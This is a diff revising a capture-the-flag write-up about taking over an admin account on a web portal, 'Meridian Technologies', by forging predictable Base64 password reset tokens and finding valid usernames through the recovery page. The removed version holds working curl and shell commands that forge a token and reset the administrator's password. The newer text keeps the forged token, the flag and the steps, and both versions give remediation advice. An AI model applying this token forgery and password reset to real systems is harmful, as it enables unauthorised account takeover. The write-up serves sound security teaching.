@@ -1,140 +1,208 @@
-# Meridian Password Reset: Account Takeover via Deterministic Token Forgery
+**Target:** Meridian Technologies — https://web2.cybernexus.live
 
-| Parameter | Details |
-| :--- | :--- |
-| **Target URL** | `https://web2.cybernexus.live` |
-| **Vulnerability Class** | Insecure Password Recovery / Predictable Token Forgery (CWE-640) |
-| **Secondary Flaw** | Observable Response Discrepancy / User Enumeration (CWE-204) |
-| **Flag** | `V3ct0r{Recovery_Tokens_are_Trusted_Identifiers}` |
+**Category:** Web Application Security
 
----
+**Vulnerabilities:** Predictable Password Reset Tokens (CWE-640), Account Enumeration (CWE-204)
 
 ## 1. Executive Summary
 
-The target system (`Meridian Technologies`) exposes an internal workforce portal featuring employee services, an internal mailbox, and an account recovery mechanism.
+The Meridian Technologies workforce portal contained a password recovery vulnerability that allowed administrative account takeover through predictable reset tokens.
 
-An architectural review of the password reset workflow revealed that recovery tokens are generated deterministically by concatenating a static prefix, the target username, and the current UTC date (`MERIDIAN-<username>-<date>`), obfuscated solely via Base64 encoding.
+Analysis of the recovery workflow revealed that tokens followed the format `MERIDIAN-<username>-<YYYYMMDD>` and were encoded using standard Base64. Since Base64 is reversible encoding rather than encryption, the token structure could be identified from a recovery token generated for the low-privilege `guest` account.
 
-Leveraging this logic flaw alongside account enumeration on the recovery endpoint, an unauthenticated attacker can forge reset tokens for high-privilege accounts. Resetting the password for `benefits-admin` yields administrative access to the workspace, enabling retrieval of internal system credentials and flags.
+The `/forgot-password` endpoint also returned different messages for registered and unregistered usernames, allowing account enumeration.
 
----
+By combining these weaknesses, a recovery token was constructed for the `benefits-admin` account. The application accepted the token, allowed the password to be reset, and provided access to the administrative workspace. The challenge flag was subsequently recovered from an internal verification note.
 
-## 2. Technical Vulnerability Analysis
+## 2. Vulnerability Details
 
-### Primary Vulnerability: Deterministic Password Reset Token (CWE-640 / CWE-330)
+### 2.1 Predictable Password Recovery Token
 
-* **Mechanism:** When a user requests a password reset via `/forgot-password`, the backend generates a reset URL in the following format:
-  ```http
-  GET /reset?token=<BASE64_TOKEN>
-  ```
-* **Flaw:** The token is non-random and predictable. The underlying payload structure is:
-  $$\text{Payload} = \text{MERIDIAN-} \parallel \text{Username} \parallel \text{-} \parallel \text{YYYYMMDD}$$
-* **Encoding:** Standard Base64 encoding without cryptographic signatures (HMAC) or server-side randomness (CSPRNG).
+**CWE-640 — Weak Password Recovery Mechanism**
 
-### Secondary Vulnerability: User Account Enumeration (CWE-204)
+**Related weakness:** CWE-330 — Use of Insufficiently Random Values
 
-* **Mechanism:** Submitting usernames to `/forgot-password` yields distinct HTTP responses based on account existence:
-  * **Registered User:** `"A recovery message has been generated for your account."`
-  * **Unregistered User:** `"If the account exists, a recovery message has been generated."`
-* **Impact:** Disclosed valid employee handles, including the administrative queue owner handle `benefits-admin`.
+The password recovery mechanism used a predictable token structure:
 
----
+```
+MERIDIAN-<username>-<YYYYMMDD>
+```
 
-## 3. Step-by-Step Exploitation Walkthrough
+The resulting string was encoded using Base64 without evidence of a cryptographically secure, unpredictable token-generation mechanism.
 
-### Step 1: Baseline Analysis & Account Enumeration
+A token obtained for the `guest` account was:
 
-Initial inspection of default credentials (`guest:guest` / `guest:12345`) granted low-privilege access to the internal workforce portal. Reviewing system communications in the internal mailbox (`/mail/2/`) revealed operational notes referencing an administrative queue owner:
+```
+TUVSSURJQU4tZ3Vlc3QtMjAyNjEwMTA=
+```
 
-```text
+Decoding the token produced:
+
+```
+MERIDIAN-guest-20261010
+```
+
+This revealed the static prefix, username, and date components.
+
+Base64 does not provide cryptographic protection. Because the underlying token was predictable, a corresponding value could be constructed for another account.
+
+### 2.2 Account Enumeration
+
+**CWE-204 — Observable Response Discrepancy**
+
+The `/forgot-password` endpoint returned different responses depending on whether the submitted username existed.
+
+For a registered account:
+
+```
+A recovery message has been generated for your account.
+```
+
+For an unregistered account:
+
+```
+If the account exists, a recovery message has been generated.
+```
+
+These different messages exposed account existence to unauthenticated users.
+
+During initial reconnaissance, the internal mailbox at `/mail/2/` contained an operational note identifying the administrative queue owner:
+
+```
 Queue owner: benefits-admin
 ```
 
-To verify account existence, a recovery request was issued for `benefits-admin`:
+Submitting this username to the recovery endpoint returned the registered-account response, confirming that the account existed.
 
-```bash
-curl -s -X POST 'https://web2.cybernexus.live/forgot-password' \
-  -d 'username=benefits-admin'
+## 3. Exploitation Walkthrough
+
+### Step 1: Initial Access and Reconnaissance
+
+The challenge-provided low-privilege account was used to access the workforce portal.
+
+The internal mailbox was inspected for operational information. A message identified the administrative queue owner as `benefits-admin`, providing a target for further testing.
+
+### Step 2: Analyze the Recovery Token
+
+A password recovery request was made for the `guest` account. The generated recovery link contained the following token:
+
+```
+TUVSSURJQU4tZ3Vlc3QtMjAyNjEwMTA=
 ```
 
-The server responded with `"A recovery message has been generated for your account."`, confirming `benefits-admin` as an active user.
-
-### Step 2: Reverse Engineering the Recovery Token Format
-
-Triggering password recovery for the control account (`guest`) produced a reset email in the mailbox containing the link:
-
-```http
-/reset?token=TUVSSURJQU4tZ3Vlc3QtMjAyNjEwMTA=
-```
-
-Decoding the token string:
-
-```bash
-echo "TUVSSURJQU4tZ3Vlc3QtMjAyNjEwMTA=" | base64 -d
-# Output: MERIDIAN-guest-20261010
-```
+It was a Base64 string. Decoding it revealed what it contained:
 
 ![Guest Token](images/guest-token.png)
 
-Analysis confirmed the token parameters:
-* Static Prefix: `MERIDIAN-`
-* Target Handle: `guest`
-* Execution Date (`YYYYMMDD`): `20261010`
+Output:
 
-### Step 3: Forging the Administrative Reset Token
-
-Using the reverse-engineered scheme, a reset token was forged for `benefits-admin` for the active date (`20261010`):
-
-```bash
-# Generate raw token string
-RAW_TOKEN="MERIDIAN-benefits-admin-20261010"
-
-# Base64 encode
-FORGED_TOKEN=$(echo -n "$RAW_TOKEN" | base64)
-echo "Forged Token: $FORGED_TOKEN"
-# Result: TUVSSURJQU4tYmVuZWZpdHMtYWRtaW4tMjAyNjEwMTA=
 ```
+MERIDIAN-guest-20261010
+```
+
+The decoded result exposed the token-generation pattern.
+
+### Step 3: Construct the Administrative Token
+
+Using the observed structure, the candidate payload for `benefits-admin` was:
+
+```
+MERIDIAN-benefits-admin-20261010
+```
+
+Encoding it using Base64:
 
 ![Admin Token](images/admin-token.png)
 
-### Step 4: Account Takeover (ATO)
+Result:
 
-The forged token was submitted to the reset endpoint to overwrite `benefits-admin`'s password:
-
-```bash
-curl -s -X POST "https://web2.cybernexus.live/reset?token=${FORGED_TOKEN}" \
-  -d 'password=HackedAdmin123!&confirm_password=HackedAdmin123!'
+```
+TUVSSURJQU4tYmVuZWZpdHMtYWRtaW4tMjAyNjEwMTA=
 ```
 
-*Response:* `Password Updated — Password has been updated successfully.`
+The constructed token was submitted to the challenge's password-reset functionality.
 
-### Step 5: Post-Exploitation & Flag Retrieval
+The server returned:
 
-1. Authenticated to `/login` using the newly assigned administrative credentials (`benefits-admin` / `HackedAdmin123!`).
-2. Navigated to the internal administration workspace at `/benefits-admin`.
-3. Accessed internal operation notes at `/benefits-admin/notes`.
-4. Located the ciphertext payload under the "Verification note" section:
-   ```html
-   <code class="ciphertext">
-       VjNjdDBye1JlY292ZXJ5X1Rva2Vuc19hcmVfVHJ1c3RlZF9JZGVudGlmaWVyc30=
-   </code>
-   ```
-5. Decoded the payload:
-   ```bash
-   echo "VjNjdDBye1JlY292ZXJ5X1Rva2Vuc19hcmVfVHJ1c3RlZF9JZGVudGlmaWVyc30=" | base64 -d
-   ```
+```
+Password Updated — Password has been updated successfully.
+```
+
+This confirmed that the application accepted the constructed token and allowed the administrative account's password to be changed.
+
+### Step 4: Access the Administrative Workspace
+
+After the password reset, the application was accessed using the administrative account.
+
+The following routes were visited:
+
+```
+/benefits-admin
+/benefits-admin/notes
+```
+
+The internal notes section contained a verification note with a Base64-encoded value.
+
+### Step 5: Retrieve the Flag
+
+The encoded verification value was:
+
+```
+VjNjdDBye1JlY292ZXJ5X1Rva2Vuc19hcmVfVHJ1c3RlZF9JZGVudGlmaWVyc30=
+```
+
+Decoding the value revealed the challenge flag:
 
 ![Recovered Flag](images/recovered-flag.png)
 
-**Final Flag:** `V3ct0r{Recovery_Tokens_are_Trusted_Identifiers}`
+```
+V3ct0r{Recovery_Tokens_are_Trusted_Identifiers}
+```
 
----
+This completed the demonstrated exploitation chain, from identifying the recovery weakness to obtaining administrative access and retrieving the flag.
 
-## 4. Remediation Guidelines
+## 4. Impact
 
-| Issue | Severity | Recommended Fix |
-| :--- | :--- | :--- |
-| **Predictable Token Generation** | Critical | Use a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG) such as Python `secrets.token_urlsafe(32)` to generate high-entropy tokens. |
-| **Token Storage Security** | High | Store tokens server-side in a hashed state (e.g., `SHA-256`) with strict single-use invalidation and short expiration timeframes (e.g., 15 minutes). |
-| **User Enumeration** | Medium | Implement generic responses for `/forgot-password` requests (e.g., *"If an account associated with this username exists, a recovery link has been sent."*). |
-| **Lack of HMAC / Digital Signatures** | High | If stateless tokens are required, sign payload parameters using `HMAC-SHA256` with a secure server-side secret key to prevent forgery. |
+The demonstrated impact in the CTF environment included:
+
+- Account enumeration through inconsistent recovery responses.
+- Forging a password recovery token for a privileged account.
+- Unauthorized password reset of the administrative account.
+- Access to the administrative workspace.
+- Retrieval of the internal challenge flag.
+
+In a real application, a similar weakness could expose sensitive information or allow administrative account takeover, depending on the privileges and resources available to the compromised account.
+
+## 5. Root Cause
+
+The primary root cause was the use of predictable information to construct a password-reset token.
+
+The token depended on a static prefix, an account identifier, and a date. Base64 encoding did not make the token unpredictable or prevent forgery.
+
+The account-enumeration issue further assisted the attack by allowing the existence of the target administrative account to be confirmed.
+
+Together, these weaknesses undermined the security of the account recovery process.
+
+## 6. Remediation
+
+**Use cryptographically secure tokens.** Generate reset tokens using a cryptographically secure random number generator. Do not derive them solely from usernames, dates, or other predictable values.
+
+**Validate tokens securely.** Bind each token to the intended account and recovery operation, and validate it on the server side.
+
+**Enforce expiration and single use.** Reset tokens should expire after a limited period and become invalid after successful use.
+
+**Prevent account enumeration.** Return consistent responses for registered and unregistered usernames, avoiding observable differences that disclose account existence.
+
+**Apply rate limiting and monitoring.** Restrict excessive recovery requests and monitor suspicious activity targeting multiple accounts or privileged users.
+
+**Protect compromised accounts.** Invalidate relevant sessions after password resets, notify account owners, and maintain security logs for investigation.
+
+## 7. Conclusion
+
+This CTF challenge demonstrated how predictable password recovery tokens can undermine authentication security.
+
+By analyzing the recovery workflow, identifying a response discrepancy, decoding the generated token, and testing the observed construction, it was possible to demonstrate administrative account takeover in the challenge environment.
+
+The key lesson is that password recovery must rely on unpredictable credentials and strict server-side validation. Encoding a predictable identifier with Base64 is not a substitute for a secure token-generation mechanism.
+
+**Flag:** `V3ct0r{Recovery_Tokens_are_Trusted_Identifiers}`
